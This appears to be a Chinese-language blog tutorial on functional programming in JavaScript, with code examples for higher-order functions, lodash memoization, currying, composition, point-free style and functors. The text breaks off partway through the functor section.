        <content type="html"><![CDATA[<ul><li>什么是高阶函数</li><li>lodash</li><li>纯函数与记忆函数</li><li>函数柯里化</li><li>函数组合与Point Free</li><li>Functor（函子）</li><li>几道习题</li></ul><h2 id="什么是高阶函数"><a href="#什么是高阶函数" class="headerlink" title="什么是高阶函数"></a>什么是高阶函数</h2><ul><li>函数可以参数</li><li>函数可以作为返回值</li><li>作用：抽象通用的问题，例如过滤数组，可以通过函数参数任意设定过滤规则</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 函数作为参数</span><span class="token keyword">function</span> forEach <span class="token punctuation">(</span>array<span class="token punctuation">,</span> fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> array<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">fn</span><span class="token punctuation">(</span>array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">forEach</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">function</span> filter <span class="token punctuation">(</span>array<span class="token punctuation">,</span> fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span> array<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">fn</span><span class="token punctuation">(</span>array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token function">filter</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> item <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 函数作为返回值</span><span class="token keyword">function</span> once <span class="token punctuation">(</span>fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> done <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>done<span class="token punctuation">)</span> <span class="token punctuation">{</span>            done <span class="token operator">=</span> <span class="token boolean">true</span>            <span class="token comment" spellcheck="true">// return fn.apply(this, arguments)</span>            <span class="token comment" spellcheck="true">// return fn.apply(fn, arguments)</span>            <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>arguments<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> pay <span class="token operator">=</span> <span class="token function">once</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>money<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`支付：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>money<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> RMB`</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token function">pay</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token function">pay</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token function">pay</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token function">pay</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//只执行一次</span></code></pre><ul><li>模拟常用高阶函数：map，every，some</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token punctuation">(</span>array<span class="token punctuation">,</span> fn<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> value <span class="token keyword">of</span> array<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">fn</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 判断数组中每一个元素是否匹配</span><span class="token keyword">const</span> every <span class="token operator">=</span> <span class="token punctuation">(</span>array<span class="token punctuation">,</span> fn<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> value <span class="token keyword">of</span> array<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res <span class="token operator">=</span> <span class="token function">fn</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span> <span class="token keyword">break</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token function">every</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> v <span class="token operator">=</span><span class="token operator">></span> v <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 判断数组中的元素是否由一个匹配</span><span class="token keyword">const</span> some <span class="token operator">=</span> <span class="token punctuation">(</span>array<span class="token punctuation">,</span> fn<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> value <span class="token keyword">of</span> array<span class="token punctuation">)</span> <span class="token punctuation">{</span>        res <span class="token operator">=</span> <span class="token function">fn</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token keyword">break</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span></code></pre><ul><li>如何实现求任意次方的函数</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 浏览器设置断点调试闭包</span><span class="token keyword">function</span> makePower <span class="token punctuation">(</span>power<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>number<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span>number<span class="token punctuation">,</span> power<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//求平方</span><span class="token keyword">let</span> power2 <span class="token operator">=</span> <span class="token function">makePower</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">let</span> power3 <span class="token operator">=</span> <span class="token function">makePower</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">power2</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="lodash-一个一致性、模块化、高性能的-JavaScript-实用工具库"><a href="#lodash-一个一致性、模块化、高性能的-JavaScript-实用工具库" class="headerlink" title="lodash:一个一致性、模块化、高性能的 JavaScript 实用工具库"></a>lodash:一个一致性、模块化、高性能的 JavaScript 实用工具库</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> _ <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token keyword">const</span> array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_<span class="token punctuation">.</span><span class="token function">first</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_<span class="token punctuation">.</span><span class="token function">last</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_<span class="token punctuation">.</span><span class="token function">toUpper</span><span class="token punctuation">(</span>_<span class="token punctuation">.</span><span class="token function">first</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="纯函数的三个条件："><a href="#纯函数的三个条件：" class="headerlink" title="纯函数的三个条件："></a>纯函数的三个条件：</h2><ul><li>给定输入，无论什么时候调用，无论调用多少次，输出总是确定的</li><li>在函数内部不可以改变函数外部对象的状态</li><li>不可以在函数内部共享函数外部的变量</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//[1,2]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//[1,2]</span><span class="token comment" spellcheck="true">//splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[1,2]</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[3,4]</span><span class="token comment" spellcheck="true">//根据第一条，slice是纯函数，splice不是</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//函数传进来的参数如果是对象的引用，会在内部改变该对象，则不是纯函数</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//函数取到了函数外的变量，不是纯函数</span><span class="token keyword">var</span> num <span class="token operator">=</span> <span class="token number">20</span> <span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> x <span class="token operator">></span> num<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>纯函数优点：可记忆，可测试</p><p><strong>使用js记忆函数来计算菲波那切数列、阶乘等，可以极大减少我们必须要做的工作，加速程序计算。</strong> </p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> _ <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token keyword">function</span> getArea <span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span>PI <span class="token operator">*</span> r <span class="token operator">*</span>r<span class="token punctuation">}</span><span class="token keyword">let</span> getAreaWithMemory <span class="token operator">=</span> _<span class="token punctuation">.</span><span class="token function">memoize</span><span class="token punctuation">(</span>getArea<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">getAreaWithMemory</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">getAreaWithMemory</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">getAreaWithMemory</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 4</span><span class="token comment" spellcheck="true">// 50..</span><span class="token comment" spellcheck="true">// 50..</span><span class="token comment" spellcheck="true">// 50..</span><span class="token comment" spellcheck="true">// 模拟实现</span><span class="token keyword">function</span> memoize <span class="token punctuation">(</span>fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> cache <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> key <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span>        cache<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> cache<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>arguments<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 不必重新执行</span>        <span class="token keyword">return</span> cache<span class="token punctuation">[</span>key<span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> getAreaWithMemory <span class="token operator">=</span> <span class="token function">memoize</span><span class="token punctuation">(</span>getArea<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">getAreaWithMemory</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">getAreaWithMemory</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">getAreaWithMemory</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="函数柯里化"><a href="#函数柯里化" class="headerlink" title="函数柯里化"></a>函数柯里化</h2><ul><li>对函数参数的缓存</li><li>让函数变得更灵活，让函数的粒度更小</li><li>把多元函数转换成一元函数，可以组合使用函数产生强大的功能</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> curry <span class="token operator">=</span> <span class="token punctuation">(</span>fn<span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span>     args<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> fn<span class="token punctuation">.</span>length       <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token operator">...</span>arguments<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">curry</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">,</span> <span class="token operator">...</span>arguments<span class="token punctuation">)</span>       <span class="token punctuation">:</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token keyword">function</span> <span class="token function">plus</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> a <span class="token operator">+</span> b <span class="token operator">+</span> c<span class="token punctuation">}</span><span class="token keyword">let</span> curryPlus <span class="token operator">=</span> <span class="token function">curry</span><span class="token punctuation">(</span>plus<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//这里给到一个有三个参数的函数</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">curryPlus</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//返回 6</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">curryPlus</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//返回 6</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">curryPlus</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//返回 6</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">curryPlus</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//返回 6</span><span class="token keyword">let</span> curryPlus <span class="token operator">=</span> <span class="token function">curry</span><span class="token punctuation">(</span>plus<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>curryPlus<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 6</span></code></pre><p>柯里化案例：正则表达式匹配字符串</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> match <span class="token punctuation">(</span>reg<span class="token punctuation">,</span> str<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>reg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">let</span> matchPlus <span class="token operator">=</span> <span class="token function">curry</span><span class="token punctuation">(</span>match<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 判断空白字符</span><span class="token keyword">const</span> haveSpace <span class="token operator">=</span> <span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/\s+/g</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">haveSpace</span><span class="token punctuation">(</span><span class="token string">'hello world'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>柯里化在Vue源码中的应用</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// src/platform/web/patch.js</span><span class="token keyword">function</span> createPatch <span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 一些操作</span>    <span class="token keyword">return</span> <span class="token keyword">function</span> patch <span class="token punctuation">(</span>vdom1<span class="token punctuation">,</span> vdom2<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> patch <span class="token operator">=</span> <span class="token function">createPatch</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 这样就不必每次都patch参数里传obj了</span></code></pre><h2 id="函数组合"><a href="#函数组合" class="headerlink" title="函数组合"></a>函数组合</h2><p>洋葱代码：<code>tOUpper(first(reverse(arr))</code></p><p>可以用函数组合把细粒度的函数组合成一个新的函数</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> compose <span class="token punctuation">(</span>f<span class="token punctuation">,</span> g<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token function">g</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 函数组合求数组中最后一个元素：先反转再获取第一个</span><span class="token keyword">function</span> reverse <span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> arr<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> first <span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token keyword">const</span> last <span class="token operator">=</span> <span class="token function">compose</span><span class="token punctuation">(</span>first<span class="token punctuation">,</span> reverse<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>last<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 在lodash中调用 _.flowRight(fn1, fn2, fn3)</span></code></pre><p><strong>模拟实现</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> reverse <span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> arr<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> first <span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">toUpper</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">const</span> f <span class="token operator">=</span> <span class="token function">compose</span><span class="token punctuation">(</span>toUpper<span class="token punctuation">,</span> first<span class="token punctuation">,</span> reverse<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">[</span>one<span class="token punctuation">,</span>two<span class="token punctuation">,</span>three<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//THREE</span><span class="token keyword">function</span> compose <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> args<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>acc<span class="token punctuation">,</span> cur<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token function">cur</span><span class="token punctuation">(</span>acc<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>简化</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> compose <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> value <span class="token operator">=</span><span class="token operator">></span> args<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span>acc<span class="token punctuation">,</span>fn<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">fn</span><span class="token punctuation">(</span>acc<span class="token punctuation">)</span><span class="token punctuation">,</span>value<span class="token punctuation">)</span></code></pre><h2 id="Point-Free模式：函数组合去实现"><a href="#Point-Free模式：函数组合去实现" class="headerlink" title="Point Free模式：函数组合去实现"></a>Point Free模式：函数组合去实现</h2><ul><li>不需要指明处理的数据</li><li>只需要合成运算过程</li><li>需要定义一些辅助的基本运算函数</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// Hello World => hello_world</span><span class="token keyword">function</span> f <span class="token punctuation">(</span>word<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> word<span class="token punctuation">.</span><span class="token function">toLowCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\s+/g</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Point Free 模式</span><span class="token keyword">const</span> f <span class="token operator">=</span> <span class="token function">compose</span><span class="token punctuation">(</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\s+/g</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> toLower<span class="token punctuation">)</span></code></pre><h2 id="Functor（函子）"><a href="#Functor（函子）" class="headerlink" title="Functor（函子）"></a>Functor（函子）</h2><ul><li>函子：可以认为函子是这样一个函数，它从一个容器中取出值， 并将其加工，然后放到一个新的容器中。这个函数的第一个输入的参数是类型的态射，第二个输入的参数是容器。 </li></ul><p>最简单的函子<code>map</code></p><pre class=" language-js"><code class="language-js"><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>sqrt<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Returns: [1, 2, 3]</span></code></pre><p>如何实现？</p><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Container</span> <span class="token punctuation">{</span>    constructor <span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>_value <span class="token operator">=</span> value    <span class="token punctuation">}</span>    map <span class="token punctuation">(</span>fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Container</span><span class="token punctuation">(</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_value<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> res <span 